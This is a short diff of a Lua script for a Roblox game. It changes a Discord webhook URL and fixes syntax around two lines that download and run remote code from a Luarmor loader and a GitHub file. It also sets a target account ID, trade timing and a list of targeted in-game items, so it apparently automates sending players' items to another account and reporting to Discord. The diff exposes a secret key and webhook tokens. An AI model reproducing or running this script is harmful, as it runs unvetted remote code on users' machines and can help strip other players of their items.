@@ -2,7 +2,7 @@ getgenv().SECRET_KEY = "mrr_cea5d89a0e534fafb03fc0d36d5d6896"
 getgenv().TARGET_ID = 9559833829
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481720546554286333/S6WZbfWyzw652WaQ8ShjXmZ_gHhINa0BY_aej7fGL_q7r6hFWeVqe-soVPrWjWr9Wiix"
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481757379732439121/-kUsvUsMKlyIo3sLQmOVWYyrt2SizIr6jqflClkr-rCV2b19az0Dk3x39j1ii_hrcJ2N"
 getgenv().TARGET_BRAINROTS = {
     ["Skibidi Toilet"] = true,
     ["Meowl"] = true,
@@ -94,12 +94,10 @@ getgenv().TARGET_BRAINROTS = {
     ["Los Amigos"] = true,
     ["Los Combinasionas"] = true,
     ["Lovin Rose"] = true
-setupBrainrotDetection()
-end)
 }
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
-emd)
+end)
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Tokinu/TP-BLOCK/refs/heads/main/GOATED"))()
 end)
